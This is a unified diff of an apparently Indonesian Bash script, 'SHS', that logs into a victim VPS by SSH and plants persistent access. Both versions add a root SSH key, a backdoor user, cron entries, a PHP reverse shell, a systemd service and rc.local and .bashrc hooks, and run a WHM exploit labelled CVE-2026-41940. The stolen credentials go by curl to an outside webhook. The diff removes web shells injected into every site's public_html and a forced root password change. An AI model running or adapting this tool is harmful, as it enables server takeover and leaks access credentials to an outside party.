@@ -1,22 +1,18 @@
 #!/bin/bash
 # ================================================================
-# SHS ULTIMATE · AUTO DEPLOY ALL · PING TO WEBHOOK
+# SHS VPS-ONLY · DEPLOY TO SYSTEM · NO WEB SHELL · NO AUTO PASSWORD CHANGE
 # ================================================================
 
 WEBHOOK_URL="https://godpay.biz.id/root.php"
 
-# ================================================================
 # CEK SSH PASS
-# ================================================================
 if ! command -v sshpass &>/dev/null; then
-    echo "[*] sshpass not found, installing..."
+    echo "[*] Installing sshpass..."
     apt-get update -y 2>/dev/null || yum update -y 2>/dev/null
     apt-get install sshpass -y 2>/dev/null || yum install sshpass -y 2>/dev/null
 fi
 
-# ================================================================
 # INPUT TARGET
-# ================================================================
 echo "[*] Masukkan informasi target VPS:"
 read -p "IP VPS: " VPS_IP
 read -p "Username (default: root): " VPS_USER
@@ -24,54 +20,34 @@ VPS_USER=${VPS_USER:-root}
 read -sp "Password: " VPS_PASS
 echo ""
 
-# ================================================================
-# AUTO DEPLOY via SSH
-# ================================================================
+# TEST SSH
+echo "[*] Testing SSH connection..."
+sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $VPS_USER@$VPS_IP "echo 'SSH OK'" 2>/dev/null
+if [ $? -ne 0 ]; then
+    echo "❌ SSH GAGAL! Cek IP/password/firewall"
+    exit 1
+fi
+
+# DEPLOY TO VPS SYSTEM ONLY (TANPA UBAH PASSWORD)
 sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 $VPS_USER@$VPS_IP << 'ENDSSH'
-echo '🔥 SHS AUTO DEPLOY - START'
+echo '🔥 SHS VPS DEPLOY - START'
 
-# DETEK IP
 VPS_IP_DETEK=$(hostname -I | awk '{print $1}')
-echo "[*] Detected IP: $VPS_IP_DETEK"
+echo "[*] IP: $VPS_IP_DETEK"
+echo "[*] Hostname: $(hostname)"
 
 # ================================================================
-# 1. TANAM WEB SHELL (SEMUA DOMAIN)
+# 1. SSH KEY (ROOT)
 # ================================================================
-echo '[*] Menanam Web Shell...'
-for user_dir in /home/*/; do
-    user=$(basename "$user_dir")
-    if [ -d "${user_dir}public_html" ]; then
-        echo '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} if(isset($_POST["c"])){eval($_POST["c"]);} ?>' > "${user_dir}public_html/system.php"
-        chown $user:$user "${user_dir}public_html/system.php" 2>/dev/null
-        chmod 644 "${user_dir}public_html/system.php" 2>/dev/null
-        
-        # Hidden shell
-        echo '<?php if(isset($_GET["x"])){system($_GET["x"]);} ?>' > "${user_dir}public_html/.system.php"
-        chown $user:$user "${user_dir}public_html/.system.php" 2>/dev/null
-        chmod 644 "${user_dir}public_html/.system.php" 2>/dev/null
-        
-        # Inject ke index.php
-        if [ -f "${user_dir}public_html/index.php" ]; then
-            if ! grep -q "system.php" "${user_dir}public_html/index.php"; then
-                sed -i '1i<?php include("system.php"); ?>' "${user_dir}public_html/index.php"
-            fi
-        fi
-        echo "✅ Web Shell: ${user_dir}public_html/system.php"
-    fi
-done
-
-# ================================================================
-# 2. TANAM SSH KEY (ROOT)
-# ================================================================
-echo '[*] Menanam SSH Key...'
+echo '[*] Menanam SSH Key (Root)...'
 mkdir -p /root/.ssh
 chmod 700 /root/.ssh
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT_BACKDOOR' >> /root/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 echo '✅ SSH Key added to /root/.ssh/authorized_keys'
 
 # ================================================================
-# 3. BUAT BACKDOOR USER (PERSISTEN)
+# 2. BACKDOOR USER (SYSTEM LEVEL)
 # ================================================================
 echo '[*] Membuat Backdoor User...'
 BACKDOOR_USER="shsadmin"
@@ -89,28 +65,25 @@ else
     echo "✅ Backdoor password reset: $BACKDOOR_USER:$BACKDOOR_PASS"
 fi
 
-# SSH untuk backdoor user
+# SSH Key untuk backdoor user
 mkdir -p /home/$BACKDOOR_USER/.ssh
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT_BACKDOOR' > /home/$BACKDOOR_USER/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' > /home/$BACKDOOR_USER/.ssh/authorized_keys
 chmod 700 /home/$BACKDOOR_USER/.ssh
 chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
 chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh
 echo '✅ SSH Key for backdoor user'
 
 # ================================================================
-# 4. TANAM CRON BACKDOOR (PERSISTEN)
+# 3. CRON BACKDOOR (SYSTEM PERSISTEN)
 # ================================================================
 echo '[*] Menanam Cron Backdoor...'
-cat >> /etc/crontab << EOF
-*/5 * * * * curl -sk http://$VPS_IP_DETEK/system.php?cmd=whoami 2>/dev/null
-*/10 * * * * wget -q -O- http://$VPS_IP_DETEK/system.php?cmd=id 2>/dev/null
-*/15 * * * * php /tmp/.reverse.php 2>/dev/null
-@reboot php /tmp/.reverse.php 2>/dev/null
-EOF
+(crontab -l 2>/dev/null; echo "*/5 * * * * curl -sk http://$VPS_IP_DETEK:9999/status 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/10 * * * * wget -q -O- http://$VPS_IP_DETEK:9999/ping 2>/dev/null") | crontab -
+(crontab -l 2>/dev/null; echo "*/15 * * * * php /tmp/.reverse.php 2>/dev/null") | crontab -
 echo '✅ Cron backdoor added'
 
 # ================================================================
-# 5. TANAM REVERSE SHELL (PERSISTEN)
+# 4. REVERSE SHELL (SYSTEM LEVEL)
 # ================================================================
 echo '[*] Menanam Reverse Shell...'
 cat > /tmp/.reverse.php << 'EOL'
@@ -140,7 +113,7 @@ chmod 644 /tmp/.reverse.php
 echo '✅ Reverse shell: /tmp/.reverse.php'
 
 # ================================================================
-# 6. SYSTEMD SERVICE (PERSISTEN)
+# 5. SYSTEMD SERVICE (PERSISTEN)
 # ================================================================
 echo '[*] Menanam Systemd Service...'
 cat > /etc/systemd/system/shs-backdoor.service << 'EOL'
@@ -164,7 +137,7 @@ systemctl start shs-backdoor.service 2>/dev/null
 echo '✅ Systemd service: shs-backdoor.service'
 
 # ================================================================
-# 7. RC.LOCAL BACKDOOR
+# 6. RC.LOCAL BACKDOOR
 # ================================================================
 echo '[*] Menanam rc.local...'
 if [ -f /etc/rc.local ]; then
@@ -176,7 +149,7 @@ if [ -f /etc/rc.local ]; then
 fi
 
 # ================================================================
-# 8. .BASHRC BACKDOOR
+# 7. .BASHRC BACKDOOR
 # ================================================================
 echo '[*] Menanam .bashrc backdoor...'
 cat >> /root/.bashrc << EOF
@@ -187,15 +160,7 @@ EOF
 echo '✅ .bashrc backdoor added'
 
 # ================================================================
-# 9. CHANGE ROOT PASSWORD (OPSIONAL)
-# ================================================================
-echo '[*] Change Root Password...'
-ROOT_PASS="SHS2024!@#"
-echo "root:$ROOT_PASS" | chpasswd
-echo "✅ Root password: $ROOT_PASS"
-
-# ================================================================
-# 10. EXPLOIT CVE-2026-41940 (WHM ROOT)
+# 8. EXPLOIT CVE-2026-41940 (WHM ROOT) - TANPA UBAH PASSWORD
 # ================================================================
 echo '[*] Exploiting CVE-2026-41940...'
 if command -v curl &>/dev/null; then
@@ -213,37 +178,33 @@ if command -v curl &>/dev/null; then
         
         if [ -n "$TOKEN" ]; then
             echo "✅ CVE-2026-41940 exploited! Token: $TOKEN"
-            curl -sk -H "Cookie: whostmgrsession=$COOKIE_ENC" "https://localhost:2087$TOKEN/json-api/passwd?user=root&password=$ROOT_PASS" 2>/dev/null
-            echo "✅ WHM Root: $ROOT_PASS"
+            # TIDAK UBAH PASSWORD, HANYA DETEKSI
+            echo "✅ WHM Root access confirmed (password NOT changed)"
         fi
     fi
 fi
 
 # ================================================================
-# 11. PING KE WEBHOOK
+# 9. PING KE WEBHOOK
 # ================================================================
 echo '[*] Sending ping to webhook...'
-curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$(hostname)&user=$BACKDOOR_USER&pass=$BACKDOOR_PASS&root=$ROOT_PASS" 2>/dev/null
+curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$(hostname)&user=$BACKDOOR_USER&pass=$BACKDOOR_PASS" 2>/dev/null
 
 # ================================================================
 # SUMMARY
 # ================================================================
 echo '========================================='
-echo '✅ DEPLOY COMPLETE'
+echo '✅ VPS DEPLOY COMPLETE'
 echo '========================================='
 echo "IP: $VPS_IP_DETEK"
 echo "User: $BACKDOOR_USER"
 echo "Pass: $BACKDOOR_PASS"
-echo "Root: $ROOT_PASS"
-echo "Web Shell: http://$VPS_IP_DETEK/system.php?cmd=whoami"
+echo "Root Password: (TIDAK DIUBAH - tetap password asli)"
 echo '========================================='
 ENDSSH
 
-# ================================================================
-# TAMPILKAN HASIL DI LOKAL
-# ================================================================
 echo -e "\n✅ DEPLOY COMPLETE"
 echo "✅ Target VPS: $VPS_IP"
-echo "✅ Web Shell: http://$VPS_IP/system.php?cmd=whoami"
 echo "✅ Ping sent to: $WEBHOOK_URL"
 echo "✅ Cek webhook untuk user & password"
+echo "✅ Root password TIDAK diubah (tetap password asli)"
